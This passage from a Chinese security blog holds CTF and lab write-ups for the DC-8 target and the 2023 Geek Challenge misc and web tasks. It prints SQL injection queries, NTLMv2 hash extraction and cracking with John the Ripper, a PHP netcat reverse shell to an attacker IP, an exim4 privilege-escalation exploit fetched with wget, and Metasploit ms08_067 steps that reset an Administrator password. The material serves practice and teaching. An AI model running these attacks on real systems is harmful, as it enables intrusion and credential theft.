src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042001296.png" alt="image-20240404200111267"></p><h4 id="5-查询数据"><a href="#5-查询数据" class="headerlink" title="5.查询数据"></a>5.查询数据</h4><pre><code>http://192.168.204.134/?nid=9 union select group_concat(name,pass) from users</code></pre><pre><code>,admin$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z,john$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF</code></pre><h4 id="6-爆破密码"><a href="#6-爆破密码" class="headerlink" title="6.爆破密码"></a>6.爆破密码</h4><p>将两个密码密文粘贴到hash.txt中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042029656.png" alt="image-20240404202902604"></p><pre><code>john --wordlist=password.lst hash.txtjohn --show hash.txt</code></pre><p>得到john用户的密码<code>turtle</code></p><h3 id="三、登陆网站后台"><a href="#三、登陆网站后台" class="headerlink" title="三、登陆网站后台"></a>三、登陆网站后台</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042031823.png" alt="image-20240404203102764"></p><p>依旧是寻找可以注入的点 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042042168.png" alt="image-20240404204212120"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042043205.png" alt="image-20240404204325157"></p><p>Drupal7不同于Drupal8 没有php代码保护 不需要我们在单独安装模块 我们先测试一波 将<code>Text format</code>选择为php code</p><p> <img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042115963.png" alt="image-20240404211557905"></p><p>保存配置 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042118515.png" alt="image-20240404211808459"></p><p>回到Contact Us主页面 随便输入一些信息(注意Email Address部分需要满足一定的邮箱格式) 点击Submit</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042119878.png" alt="image-20240404211935825"></p><p>此时php语句已经成功被执行 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042120312.png" alt="image-20240404212051252"></p><h3 id="四、反弹shell"><a href="#四、反弹shell" class="headerlink" title="四、反弹shell"></a>四、反弹shell</h3><p>有了上面的验证 我们直接写语句进行反弹shell</p><p>重复刚才的步骤  写入</p><pre><code>&lt;?phpsystem(&quot;nc -e /bin/bash 192.168.204.129 1111&quot;); ?&gt;</code></pre><p>在我们的kali攻击机中监听端口</p><pre><code>nc -lvvp 1111</code></pre><p>回到Contact Us主页面 点击Submit 反弹shell成功</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042135637.png" alt="image-20240404213541597"></p><p>创造一个交互式页面</p><pre><code>./46996.sh -m netcat</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042139987.png" alt="image-20240404213933944"></p><h3 id="五、exim4提权"><a href="#五、exim4提权" class="headerlink" title="五、exim4提权"></a>五、exim4提权</h3><p>www-data是个低权限用户 我们查找一下他可以利用的suid提权方法</p><pre><code>find / -type f -perm -u=s 2&gt;dev/null</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042142572.png" alt="image-20240404214211541"></p><p>看到熟悉的exim4 和DC-4一样的操作</p><p>找到脚本的路径</p><pre><code>searchsploit -p 46996.sh</code></pre><p><a href="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051619549.png"><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051619549.png" alt="image-20231205161924515"></a></p><p>将脚本复制到桌面</p><pre><code>cp /usr/share/exploitdb/exploits/linux/local/46996.sh 46996.sh </code></pre><p>开启apache服务</p><pre><code>systemctl start apache2.service</code></pre><p>将这个漏洞攻击文件转移到<code>/var/html/www</code>文件夹下</p><pre><code>mv 46996.sh /var/www/html </code></pre><p>将文件从攻击机下载到靶机<code>/tmp</code>中</p><pre><code>wget http://192.168.160.150/46996.sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042148502.png" alt="image-20240404214814404"></p><p>赋予执行权限</p><pre><code>chmod +x 46996.sh</code></pre><p>执行脚本 发现得到root权限</p><pre><code>./46996.sh -m netcatwhoami</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042148195.png" alt="image-20240404214841118"></p><p>进入root文件夹 获取flag</p><pre><code>cd /rootcat flag.txt</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042151688.png" alt="image-20240404215123628"></p><p>至此 DC-8结束</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.sql注入联合查询获取网站后台登陆密码</p><p>2.命令注入反弹shell</p><p>3.exim4提权</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023极客大挑战</title>
      <link href="/2024/04/01/2023%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
      <url>/2024/04/01/2023%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h1 id="2023极客大挑战"><a href="#2023极客大挑战" class="headerlink" title="2023极客大挑战"></a>2023极客大挑战</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="DEATH-N0TE-图片放缩"><a href="#DEATH-N0TE-图片放缩" class="headerlink" title="DEATH_N0TE(图片放缩)"></a>DEATH_N0TE(图片放缩)</h3><p>题目说有两部分flag  且隐写信息极多 那就好说多了 直接考虑图片隐写</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281318707.png" alt="image-20231028131843223"></p><p>使用010editor在图片尾找到一串字符 进行base解码</p><pre><code>&quot;你找到了一本《DEATH NOTE》，好奇心驱使你翻开这本笔记，你阅读了使用规则，但是你惊讶地发现刚才的规则之中唯独没有第10条...&quot;&quot;你再次去确认是否如此，笔记上的文字却仿佛活了起来，在你眼中不断地放大缩小，你闭上了双眼...&quot;&quot;原本黑色的文字一转变成血红色，诡异的画面还是出现于你的视网膜前，你决定不再纠结于遗失的规则，幻觉消失了...&quot;</code></pre><p>既然是png文件 在考虑一下lsb隐写 </p><p>一看这幅死样子 果然有问题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281309995.png" alt="image-20231028130932821"></p><p>提取一下信息 在r g b三通道的0位 又是一串base编码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626470.png" alt="image-20231028131028697"></p><p>解码 得到第一部分flag</p><pre><code>&quot;你继续观察手上漆黑色的笔记本，冷静下来的你发现了藏在封面最下边的一行小字:SYC&#123;D4@Th_N0t4_&quot;&quot;你浏览过整个笔记本，可惜全是空白页，其中有一页不知道被谁撕掉了，你最终还是翻到了缺失的那一页&quot;&quot;你用铅笔涂抹着后面一页，上面缓缓出现了遗失的痕迹...&quot;</code></pre><p>在观察lsb隐写的时候就会发现 图片表面好像是有水印一样 依稀能辨认出是什么字符</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281315702.png" alt="image-20231028131506633"></p><p>猜测是一些奇怪字体的英文字母 结合是《死亡笔记》的大背景 搜索一下 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281315573.png" alt="image-20231028131556530"></p><p>确认是哥特字体 找个对照图 <a href="https://tieba.baidu.com/p/1442714710">死亡笔记中哥特字体对照图 </a>  有一点要注意 原图下半部分颜色太亮 会影响水印的观察读取 使用ps将颜色调成全黑 就可以看清了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626468.png" alt="image-20231028131707893"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281317951.png" alt="image-20231028131719892"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281318686.png" alt="image-20231028131801643"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281318512.png" alt="image-20231028131821465"></p><p>分成四部分来看 结果是 </p><pre><code>TkFNRV9vMnRha3VYWH0=</code></pre><p>看到后面有等号 鉴定为base64 解码</p><pre><code>NAME_o2takuXX&#125;</code></pre><p>现在两部分flag就全了</p><pre><code>SYC&#123;D4@Th_N0t4_NAME_o2takuXX&#125;</code></pre><p>但其实还是需要练习一下写脚本的能力</p><p>根据前面文字中的第10条放大缩小  猜测需要将原图片缩小10倍</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231202200110895.png" alt="image-20231202200110895"></p><p>查看原图片像素为(3300,1800) 那么缩小10倍就是(330,180)</p><p>写脚本</p><pre><code class="python">from PIL import Imageimg = Image.open(&quot;kamisama.png&quot;)size = img.sizesmall_size = (int(size[0] / 10), int(size[1] / 10))img_small = img.resize(small_size, Image.NEAREST)img_small.save(&quot;flag.png&quot;)</code></pre><p><font color='red'>这里要注意 要使用PIL库中缩放图片算法中的<code>NEAREST</code>模式</font></p><h3 id="DEATH-N1TE"><a href="#DEATH-N1TE" class="headerlink" title="DEATH_N1TE"></a>DEATH_N1TE</h3><p>第一部分看到动态图 一眼拼图 先把webp动态图转换为gif图<a href="https://cloudconvert.com/">webp转gif</a> 在分帧</p><p> 使用montage拼图 gaps恢复顺序</p><pre><code>montage ./*.png -tile 40x22 -geometry +0+0 flag.pnggaps --image=flag.png --generations=200 --size=48 --save</code></pre><p>拼的不是特别完美 但是可以看出是base64编码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626538.png" alt="image-20231103091126052"></p><p>拿到后半部分flag</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231103091207601.png" alt="image-20231103091207601"></p><pre><code>_14_Ki114R&#125;</code></pre><p>后面的音频 一听就是慢扫描电视 把后半部分提取出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626543.png" alt="image-20231103092040221"></p><p>使用工具将图片扫出来 得到第一部分flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626684.png" alt="image-20231103092106149"></p><pre><code>SYC&#123;H4xr0t0r</code></pre><h3 id="DEATH-N2TE-gif分帧-图片放缩-像素拼接"><a href="#DEATH-N2TE-gif分帧-图片放缩-像素拼接" class="headerlink" title="DEATH-N2TE(gif分帧 图片放缩 像素拼接)"></a>DEATH-N2TE(gif分帧 图片放缩 像素拼接)</h3><pre><code>&quot;你知道了真相，正带上《DEATH NOTE》准备逃离，恰好，Muscial发给你一个视频，并说:&quot; &quot;[这里记下了他的真名以及照片，请写在那本笔记上面，我和Arahat0都被他看见了真名...]&quot;。 </code></pre><p>观察视频 可以看到很明显的竖列白色像素条经过</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312031228556.png" alt="image-20231203122830104"></p><p>首先对图片进行分帧 找个软件就行 分出192张图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312031217015.png" alt="image-20231203121724885"></p><p>和DEATH_N0TE一样 先写个脚本将这些图片缩小十倍 原图片每张是1920x1080 那缩小后就是192x108</p><pre><code class="python">from PIL import Imagefor i in range(1, 193):    img = Image.open(r&#39;E:\Desktop\比赛/2023极客大挑战\misc\DEATH_N2TE\out/frame_&#123;&#125;.png&#39;.format(i))    size_small = (192,108)    img_small = img.resize(size_small, Image.NEAREST)    img_small.save(r&quot;E:\Desktop\比赛/2023极客大挑战\misc\DEATH_N2TE\out\small\&#123;&#125;.png&quot;.format(i))</code></pre><p>然后在写脚本将这些像素点进行拼接即可</p><pre><code class="python">from PIL import Imageimg1 = Image.new(&quot;RGB&quot;, (192,108), 0)for i in range(1, 193):    img = Image.open(r&quot;E:\Desktop\比赛\2023极客大挑战\misc\DEATH_N2TE\out\small/&#123;&#125;.png&quot;.format(i))    img.convert(&quot;1&quot;)    for x in range(192):        if x+1 == i:            for y in range(108):                img1.putpixel((x,y),img.getpixel((x,y)))img1.save(&quot;flag.png&quot;)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312031936544.png" alt="image-20231203193625446"></p><h3 id="xqr-图片等比例放大缩小-图片异或"><a href="#xqr-图片等比例放大缩小-图片异或" class="headerlink" title="xqr(图片等比例放大缩小 图片异或)"></a>xqr(图片等比例放大缩小 图片异或)</h3><p>给了一张二维码 扫一下 是false flag</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231201203621826.png" alt="image-20231201203621826"></p><p>在这张二维码的后面 还有一个图片 提取出来</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231201204635440.png" alt="image-20231201204635440"></p><p>看起来也是一张二维码 但是没有四个定位点 猜测需要异或 wp中说直接放在ps中 使用差值模式就可以得到反向flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626867.png" alt="image-20231201205048854"></p><p>扫码就可以得到flag</p><p>这个方法有点抽象 这边使用另一个方法 通过观察发现 原图片像素为75x75 分离出来的图片像素是25x25 刚好是原图片的1&#x2F;3</p><p>写个脚本 先将分离出来的图片等比例放大到75x75的像素</p><pre><code class="python">from PIL import Imageimg_input = Image.open(&quot;1.png&quot;) # 打开图片size_origin = img_input.size    # 读取像素size_big = (int(size_origin[0]*3), int(size_origin[1]*3))  # 扩大像素img_big = img_input.resize(size_big, Image.LANCZOS) # 创建新图片 new_size = (75, 75)new_img = Image.new(&quot;RGBA&quot;, new_size, (255,255,255))  # 创建新画布position = ((new_size[0] - size_big[0]) // 2, (new_size[1] - size_big[1]) // 2) # 确保新图片在新画布中心new_img.paste(img_big, position)           # 将新图片放在新画布上new_img.save(&quot;0.png&quot;)  # 保存图片</code></pre><p>在写脚本 将两张图片异或</p><pre><code class="python">from PIL import Imageimport numpyimg1 = Image.open(&quot;0.png&quot;)img2 = Image.open(&quot;xqr.png&quot;)array1 = numpy.array(img1)array2 = numpy.array(img2)xor_result = numpy.bitwise_xor(array1, array2)  # 对两张图片的像素进行逐位异或result_img = Image.fromarray(xor_result)        # 从NumPy数组创建新图像result_img.save(&quot;flag.png&quot;)</code></pre><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231201215744925.png" alt="image-20231201215744925"></p><p>扫码即可</p><h3 id="extractme-压缩包crc32爆破"><a href="#extractme-压缩包crc32爆破" class="headerlink" title="extractme(压缩包crc32爆破)"></a>extractme(压缩包crc32爆破)</h3><p>打开压缩包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626559.png" alt="image-20231202194137644"></p><p>发现每个文件都很小 且大小一样 给出了crc32校验值 想到crc32爆破</p><p>写个脚本 循环爆破一下</p><pre><code class="python">from binascii import crc32import stringcrc_values = [0x8712de1d, 0x06eacbd7, 0x20a8e291, 0x31ee3074, 0x77aacf7f, 0x35fb7c6c, 0xf978d5aa, 0x016f7a0b]char_set = string.printableflag = dict(zip(crc_values, [None]*len(crc_values)))  # 创建一个字典flag zip函数将两个列表中的元素一一配对 字典中的键是crc_values中的值 键对应的值是Nonefor a in char_set:    for b in char_set:        for c in char_set:            for d in char_set:                s = a + b + c + d                crc_result = crc32(bytes(s, &#39;ascii&#39;)) &amp; 0xffffffff  # 计算字符串s的crc32值                if crc_result in crc_values:                    print(s, hex(crc_result))                    flag[crc_result] = s        # 当crc_values的值和crc_result匹配上时 将字典flag中对应于CRC32值crc_result的项的值更新为字符串sprint(&#39;&#39;.join([str(_) for _ in flag.values()]))  # 使用列表推导式遍历 flag 字典的所有值 将每个值转化为字符串 使用join方法连接每个字符串形成一个单独的字符串# SYC&#123;_cR@ck_1s_Useful_sometime$_&#125;</code></pre><h3 id="ez-smilemo"><a href="#ez-smilemo" class="headerlink" title="ez_smilemo"></a>ez_smilemo</h3><p>没玩出来 看官方wp说搜一个可以打开<code>data.win</code>文件的工具  <a href="https://github.com/krzys-h/UndertaleModTool">UndertaleModTool</a></p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231202195600301.png" alt="image-20231202195600301"></p><p>下好后 使用Undertalemodtool打开data.win 直接搜索flag 可以找到一段关于flag的代码和flag的base64值</p><pre><code>c20xbGVfMXNfQF9uMWNlX2dAbWU=sm1le_1s_@_n1ce_g@me</code></pre><h3 id="窃听风云-有NTLMv2散列的pcap文件"><a href="#窃听风云-有NTLMv2散列的pcap文件" class="headerlink" title="窃听风云(有NTLMv2散列的pcap文件)"></a>窃听风云(有NTLMv2散列的pcap文件)</h3><pre><code>题目描述：Hacker捕获到了一段敌对公司的对话信息流量，你能从流量中分析出Jack的密码吗，flag为SYC&#123;password&#125;</code></pre><p>参考文章 <a href="https://zhuanlan.zhihu.com/p/52882041">9步从pcap文件中提取并破解 NTLMv2 哈希</a></p><p>首先 看到流量包中有http协议 先导出一下HTTP</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626998.png" alt="image-20231202204849122"></p><p>在其中一个chat.txt文件中找到线索</p><pre><code>Boss: Jack, what&#39;s the matter with you? This year in HW, the red team used a weak password to log in to your account again!Jack: Sorry boss, but the password I set is already very long.Boss: Among the clues provided by the referee, it is said that your password is in a dictionary called rockyou.txt.gzJack: Okay, I&#39;ll modify it as soon as possibleBoss: Wait, are you still using that password?Jack: Yes, what&#39;s wrong?Boss: Damn, someone overheard our conversation. Exit the chat room immediately!</code></pre><p>大概意思是要我们找到Jack设置的弱密码 这个密码在rockyou.txt这个字典中还出现过</p><p>那提到rockyou.txt 肯定要想到爆破哈希密码了 本题就是NTLMv2哈希密码</p><p>那我们直接跟着参考文章中的步骤一点点找</p><p>1.先过滤ntlmssp字段 获得身份验证的握手包</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231202210215044.png" alt="image-20231202210215044"></p><p>2.查找<code>NTLMSSP_AUTH</code>包  查看HTTP数据 看到用户名和域名</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626480.png" alt="image-20231202210435547"></p><pre><code>User name:jackHost name:CLIENT01</code></pre><p>3.找到NTProofStr字段和NTLMv2的响应部分</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231202213216475.png" alt="image-20231202213216475"></p><pre><code>ntlmssp.ntlmv2_response.ntproofstr：2d1d24572b15fe544043431c59965d30ntlmssp.ntlmv2_response：2d1d24572b15fe544043431c59965d300101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</code></pre><p>但是注意响应部分是以NTProofStr字段开头的 要将这部分删掉</p><p>4.过滤筛选出ntlmssp.ntlmserverchallenge 找到NTLM Server Challenge字段 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626943.png" alt="image-20231202213540576"></p><pre><code>NTLM Server Challenge: 2af71b5ca7246268</code></pre><p>5.写hash文件</p><pre><code>username::domain:ServerChallenge:NTproofstring:modifiedntlmv2responsejack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</code></pre><p>6.使用hashcat或者john爆破密码</p><pre><code>john --wordlist=rockyou.txt --user=jack hash.txt out.txtjohn hash.txt -show</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312031129995.png" alt="image-20231203112929933"></p><p>所以泄漏的密码为</p><pre><code>iamjackpassword</code></pre><h3 id="窃听风云v2"><a href="#窃听风云v2" class="headerlink" title="窃听风云v2"></a>窃听风云v2</h3><pre><code>题目描述：这次Hacker捕获到了Jack登录邮件系统的流量，你还能从流量中分析出Jack的密码吗，flag为SYC&#123;password&#125;</code></pre><p>考的还是ntlm的hash 但是是被base64加密之后的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312031955240.png" alt="image-20231203195518193"></p><p>在服务端返回250和235代码之间的包是认证的过程 从这几个包里面找和上一道题一样的hash</p><p>题目说是邮件 找SMTP流量 SMTP11包是认证成功的包 在这里解base64</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312031953720.png" alt="image-20231203195350638"></p><p>和上题一样 开始找hash内容</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312032003432.png" alt="image-20231203200346363"></p><pre><code>username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</code></pre><pre><code>username: jackdomain: WidgetLLC.Internal</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312032010206.png" alt="image-20231203201020167"></p><pre><code>NTLM Server Challenge: 3e3966c8cacd29f7</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312032010387.png" alt="image-20231203201052345"></p><pre><code>NTProofStr: ddd46fd8f78c262eae16918f66185497NTLMv2 Response: ddd46fd8f78c262eae16918f66185497010100000000000050fd26d235edd9011219408ccb8a364800000000020012005700490044004700450054004c004c0043000100100043004c00490045004e00540030003300040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000300360043004c00490045004e005400300033002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000700080050fd26d235edd90106000400020000000800300030000000000000000000000000300000c78e803920758ec5672c36696ee163f6a4e61c8b5463c247daef8571677995a40a001000000000000000000000000000000000000900200053004d00540050002f0075006e007300700065006300690066006900650064000000000000000000</code></pre><p>合在一起</p><pre><code>jack::WidgetLLC.Internal:3e3966c8cacd29f7:ddd46fd8f78c262eae16918f66185497:010100000000000050fd26d235edd9011219408ccb8a364800000000020012005700490044004700450054004c004c0043000100100043004c00490045004e00540030003300040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000300360043004c00490045004e005400300033002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000700080050fd26d235edd90106000400020000000800300030000000000000000000000000300000c78e803920758ec5672c36696ee163f6a4e61c8b5463c247daef8571677995a40a001000000000000000000000000000000000000900200053004d00540050002f0075006e007300700065006300690066006900650064000000000000000000</code></pre><pre><code>john --wordlist=rockyou.txt hash1.txt out.txtjohn hash1.txt --show</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312032018282.png" alt="image-20231203201818216"></p><pre><code>jack100589barney</code></pre><p><a href="https://r0fus0d.blog.ffffffff0x.com/post/windows-authenticate/#ntlmv2">windows认证</a></p><h3 id="时代的眼泪"><a href="#时代的眼泪" class="headerlink" title="时代的眼泪"></a>时代的眼泪</h3><p>非预期解是直接解压vmdk文件 在文件中找 flag就在桌面壁纸中</p><pre><code>Tears_of_the_times-disk1.vmdk\Documents and Settings\Administrator\Local Settings\Application Data\Microsoft\Wallpaper1.bmp</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022317301.png" alt="image-20231202231748947"></p><p>预期解就是小小的渗透一下</p><p>首先点击<code>Tears of the times.ovf</code> 将虚拟机导入vmware中 但是发现需要密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022324569.png" alt="image-20231202232444471"></p><p>使用kali攻击机 先扫一下靶机的ip</p><pre><code>nmap 192.168.160.0/24</code></pre><p>扫出是<code>192.168.160.154</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022325444.png" alt="image-20231202232525386"></p><p>在进一步扫一下开放的端口</p><pre><code>nmap -T4 -sC -sV 192.168.160.154</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022326081.png" alt="image-20231202232625013"></p><p>也进一步证明了 我们扫出来的ip就是靶机ip</p><p>找一下windows xp系统经典漏洞</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022332287.png" alt="image-20231202233209226"></p><p>里面提到的是<code>ms08-067</code>漏洞</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022332564.png" alt="image-20231202233255495"></p><p>就找这个漏洞</p><pre><code>search ms08_067</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022335590.png" alt="image-20231202233538548"></p><pre><code>use 0set RHOST 192.168.160.154run shell</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022337221.png" alt="image-20231202233737168"></p><p>拿到shell之后 直接修改Administrator用户的密码</p><pre><code>net user administrator 123456</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312022339217.png" alt="image-20231202233911179"></p><p>修改完毕 直接登陆 直接在桌面上看到flag了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626409.png" alt="image-20231202234000689"></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="EzHttp"><a href="#EzHttp" class="headerlink" title="EzHttp"></a>EzHttp</h3><p>需要使用post传入username和password 随便传一个 然后抓包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281624351.png" alt="image-20231028162430309"></p><p>想到<code>robots.txt</code> 访问一下 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281626931.png" alt="image-20231028162605895"></p><p>在访问一下<code>/o2takuXX&#39;s_username_and_password.txt </code>得到username和password</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281932950.png" alt="image-20231028193242789"></p><p>使用正确的账号密码进行登陆 是对http请求头进行操作 分别是</p><pre><code>必须来源自sycsec.com请使用Syclover浏览器请使用Syc.vip代理</code></pre><p>对http请求头进行修改 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310282131987.png" alt="image-20231028213106688"></p><p>对于最后一步</p><pre><code class="php">&lt;?phpif($_SERVER[&#39;HTTP_O2TAKUXX&#39;]==&quot;GiveMeFlag&quot;)&#123;    echo $flag;&#125;?&gt;</code></pre><p>就是要求http请求头中的<code>O2TAKUXX</code>字段的值要为<code>GiveMeFlag </code> 这里要注意在php中 所有http请求头中的内容前都会有<code>HTTP_</code>前缀 所以我们真实需要在http请求头中上传的参数是<code>O2TAKUXX</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310282150349.png" alt="image-20231028215029154"></p><h3 id="easy-php-php绕过"><a href="#easy-php-php绕过" class="headerlink" title="easy_php(php绕过)"></a>easy_php(php绕过)</h3><pre><code class="php">&lt;?phpheader(&#39;Content-type:text/html;charset=utf-8&#39;);error_reporting(0);highlight_file(__FILE__);include_once(&#39;flag.php&#39;);if(isset($_GET[&#39;syc&#39;])&amp;&amp;preg_match(&#39;/^Welcome to GEEK 2023!$/i&#39;, $_GET[&#39;syc&#39;]) &amp;&amp; $_GET[&#39;syc&#39;] !== &#39;Welcome to GEEK 2023!&#39;) &#123;    if (intval($_GET[&#39;lover&#39;]) &lt; 2023 &amp;&amp; intval($_GET[&#39;lover&#39;] + 1) &gt; 2024) &#123;        if (isset($_POST[&#39;qw&#39;]) &amp;&amp; $_POST[&#39;yxx&#39;]) &#123;            $array1 = (string)$_POST[&#39;qw&#39;];            $array2 = (string)$_POST[&#39;yxx&#39;];            if (sha1($array1) === sha1($array2)) &#123;                if (isset($_POST[&#39;SYC_GEEK.2023&#39;])&amp;&amp;($_POST[&#39;SYC_GEEK.2023&#39;]=&quot;Happy to see you!&quot;)) &#123;                    echo $flag;                &#125; else &#123;                    echo &quot;再绕最后一步吧&quot;;                &#125;            &#125; else &#123;                echo &quot;好哩，快拿到flag啦&quot;;            &#125;        &#125; else &#123;            echo &quot;这里绕不过去，QW可不答应了哈&quot;;        &#125;    &#125; else &#123;        echo &quot;嘿嘿嘿，你别急啊&quot;;    &#125;&#125;else &#123;    echo &quot;不会吧不会吧，不会第一步就卡住了吧，yxx会瞧不起你的！&quot;;&#125;?&gt; </code></pre><p>第一步  </p><pre><code>preg_match(&#39;/^Welcome to GEEK 2023!$/i&#39;, $_GET[&#39;syc&#39;])：这部分使用正则表达式来检查&#39;syc&#39;参数的值是否匹配模式&#39;/^Welcome to GEEK 2023!$/i&#39;。正则表达式中的&#39;i&#39;表示不区分大小写，也就是说，它会匹配值为&quot;Welcome to GEEK 2023!&quot;的任何大小写形式。$_GET[&#39;syc&#39;] !== &#39;Welcome to GEEK 2023!&#39;是检查syc的值 需要完全不等于Welcome to GEEK 2023!因为preg_match的判断中不区分大小写 